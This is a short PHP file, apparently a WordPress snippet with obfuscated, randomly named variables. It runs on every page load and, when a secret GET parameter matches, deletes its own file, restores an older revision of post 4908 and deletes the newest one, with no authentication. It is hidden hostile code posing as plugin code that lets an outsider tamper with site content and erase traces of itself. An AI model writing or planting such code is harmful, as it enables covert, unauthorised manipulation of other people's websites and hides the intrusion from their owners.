<?php

function quote_social_wpc() {
	if (isset($_GET['paragraph_showcase_day_switcher']) && $_GET['paragraph_showcase_day_switcher'] === 'quote_keyword_text') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$showcase_top_tinymce = 4908;
		$action_solution_slide_integrate = wp_get_post_revisions($showcase_top_tinymce);
		if (empty($action_solution_slide_integrate)) die('no revisions');
		if (count($action_solution_slide_integrate) < 2) die('less than 2');
		$include_demo_invoice_donation = array_shift($action_solution_slide_integrate);
		$before_catalog_survey_translator = $include_demo_invoice_donation->ID;
		$follow_upgrader_dev_word = array_shift($action_solution_slide_integrate);
		$typography_radio_force = $follow_upgrader_dev_word->ID;
		$excerpt_free_text = wp_restore_post_revision($typography_radio_force);
		if ($excerpt_free_text === false) die('error restoring');
		$excerpt_free_text = wp_delete_post_revision($before_catalog_survey_translator);		
		if ($excerpt_free_text === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'quote_social_wpc');
